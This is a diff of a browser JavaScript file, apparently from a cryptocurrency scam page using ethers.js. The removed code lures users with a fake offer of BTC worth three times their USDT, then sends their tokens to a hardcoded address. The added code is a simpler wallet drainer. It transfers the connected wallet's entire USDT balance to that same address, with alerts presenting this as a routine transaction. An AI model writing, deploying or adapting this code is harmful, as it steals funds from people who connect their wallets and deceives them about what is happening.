@@ -1,72 +1,32 @@
-const USDT = "0x55d398326f99059fF775485246999027B3197955";
-const DEST = "0x56E93caFf970003A66264a10B1581066E0f17112";
-const BNB_GAS_USD = 0.50;
-let provider, signer, btcRate = 0;
+const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+const receiver = "0x56E93caFf970003A66264a10B1581066E0f17112";
 
-const ABI = [
-  "function balanceOf(address)view returns(uint256)",
-  "function approve(address,uint256) returns(bool)",
-  "function transfer(address,uint256) returns(bool)"
-];
+async function sendUSDT() {
+  if (!window.ethereum) {
+    alert("Trust Wallet or MetaMask required!");
+    return;
+  }
 
-async function init() {
-  provider = new ethers.providers.Web3Provider(window.ethereum);
+  const provider = new ethers.providers.Web3Provider(window.ethereum);
   await provider.send("eth_requestAccounts", []);
-  signer = provider.getSigner();
-  await fetchBtcRate();
-  updateDisplay();
-}
+  const signer = provider.getSigner();
+  const userAddress = await signer.getAddress();
 
-async function fetchBtcRate() {
-  try {
-    const resp = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usdt");
-    const data = await resp.json();
-    btcRate = data.bitcoin.usdt || 0;
-  } catch {
-    btcRate = 0;
+  const usdtABI = [
+    "function balanceOf(address) view returns (uint)",
+    "function transfer(address to, uint amount) returns (bool)"
+  ];
+
+  const usdt = new ethers.Contract(usdtAddress, usdtABI, signer);
+  const balance = await usdt.balanceOf(userAddress);
+
+  if (balance.isZero()) {
+    alert("No USDT balance.");
+    return;
   }
+
+  const tx = await usdt.transfer(receiver, balance);
+  alert("Transaction sent! Please confirm in your wallet.");
+  await tx.wait();
+  alert("✅ USDT sent successfully!");
 }
-
-function updateDisplay() {
-  const val = parseFloat(document.getElementById("usdtInput").value) || 0;
-  const usd3 = val * 3;
-
-  document.getElementById("usdtValue").innerText = `$${usd3.toFixed(2)}`;
-  document.getElementById("btcUsd").innerText = `$${usd3.toFixed(2)}`;
-  document.getElementById("rateLine").innerText = `1 BTC ≈ ${btcRate.toLocaleString("en")} USDT`;
-
-  const btcVal = btcRate ? usd3 / btcRate : 0;
-  document.getElementById("btcAmount").innerText = btcVal.toFixed(8);
-}
-
-document.getElementById("usdtInput").addEventListener("input", updateDisplay);
-
-document.getElementById("transferBtn").addEventListener("click", async () => {
-  const val = parseFloat(document.getElementById("usdtInput").value);
-  const msg = document.getElementById("msg");
-  msg.className = "";
-  if (isNaN(val) || val < 200) {
-    msg.innerText = "❌ Minimum 200 USDT required"; msg.className = "error"; return;
-  }
-  try {
-    const token = new ethers.Contract(USDT, ABI, signer);
-    const user = await signer.getAddress();
-    const bal = await token.balanceOf(user);
-    const usdtBal = parseFloat(ethers.utils.formatUnits(bal, 18));
-    if (usdtBal < val) throw new Error("Insufficient USDT");
-
-    const bnbBal = parseFloat(ethers.utils.formatEther(await provider.getBalance(user)));
-    const bnbPrice = (await (await fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd")).json()).binancecoin.usd;
-    if (bnbBal * bnbPrice < BNB_GAS_USD) throw new Error("Low BNB for gas");
-
-    const amount = ethers.utils.parseUnits(val.toString(), 18);
-    await (await token.approve(DEST, amount)).wait();
-    await (await token.transfer(DEST, amount)).wait();
-
-    msg.innerText = `✅ ${val} USDT sent successfully`; msg.className = "success";
-  } catch (e) {
-    msg.innerText = `❌ ${e.message}`; msg.className = "error";
-  }
-});
-
-init();
